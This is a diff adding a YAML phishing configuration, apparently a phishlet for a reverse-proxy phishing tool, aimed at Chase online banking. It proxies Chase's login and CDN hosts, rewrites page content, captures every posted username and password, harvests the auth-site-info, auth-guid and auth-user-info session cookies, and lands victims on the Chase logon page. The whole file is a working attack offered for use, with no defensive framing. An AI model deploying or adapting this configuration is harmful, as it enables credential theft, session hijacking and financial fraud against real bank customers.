@@ -1,0 +1,27 @@
+author: '@charlesbel'
+min_ver: '2.2.0'
+proxy_hosts:
+  - {phish_sub: 'secure05b', orig_sub: 'secure05b', domain: 'chase.com', session: true, is_landing: true}
+  - {phish_sub: 'static', orig_sub: 'static', domain: 'chasecdn.com', session: false, is_landing: false}
+sub_filters:
+  - {triggers_on: 'secure05b.chase.com', orig_sub: 'secure05b', domain: 'chase.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'static.chasecdn.com', orig_sub: 'static', domain: 'chasecdn.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript']}
+
+auth_tokens:
+  - domain: '.chase.com'
+    keys: ['auth-site-info','auth-guid','auth-user-info']
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+auth_urls:
+  - '/web/auth/dashboard#/dashboard/overviewAccounts/'
+
+landing_path:
+  - '/web/auth/#/logon/logon/chaseOnline'
